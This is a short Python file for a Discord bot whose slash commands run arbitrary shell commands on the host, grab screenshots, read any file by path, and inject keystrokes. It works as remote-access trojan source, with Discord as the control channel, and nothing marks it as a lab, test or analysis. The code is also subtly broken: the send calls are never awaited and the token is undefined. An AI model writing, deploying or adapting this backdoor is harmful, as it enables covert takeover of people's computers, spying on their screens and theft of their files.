from disnake.ext import commands
from PIL import ImageGrab
import disnake
import os
import keyboard

bot = commands.InteractionBot()

@bot.slash_command()
async def exec(ctx, cmd):
  ctx.send(os.popen(cmd).read())

@bot.slash_command()
async def ss(ctx):
  ctx.send(ImageGrab.grab())

@bot.slash_command()
async def readfile(ctx, cmd):
  f = open(cmd, "r")
  lines = f.readlines()
  ctx.send(lines)

@bot.slash_command()
async def type(ctx, cmd):
  ctx.send(keyboard.write(cmd))

@bot.slash_command()
async def pressKey(ctx, cmd):
  keyboard.press(cmd)
  ctx.send("pressing key %s" % cmd)

@bot.slash_command()
async def releaseKey(ctx, cmd):
  keyboard.release(cmd)
  ctx.send("released key %s" % cmd)

bot.run(token)
